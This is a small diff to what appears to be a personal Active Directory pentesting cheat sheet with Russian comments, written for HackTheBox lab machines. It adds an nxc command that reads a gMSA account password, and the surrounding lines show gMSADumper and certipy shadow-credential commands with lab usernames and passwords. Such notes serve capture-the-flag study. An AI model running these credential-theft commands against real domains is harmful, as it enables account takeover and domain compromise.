@@ -183,6 +183,9 @@ Silvercore_21
     получить NTLM закрытой учетки GMSA
     python gMSADumper.py -u 'mark.adams' -p 'password' -d haze.htb -l dc01.haze.htb
 
+    прочитать пароль gMSA
+    nxc ldap -u javier.mmarshall -p 'Password123' -k --gmsa dc01.mirage.htb
+
 # GenericWrite
 # Shadow Credential
      certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account WINRM_SVC
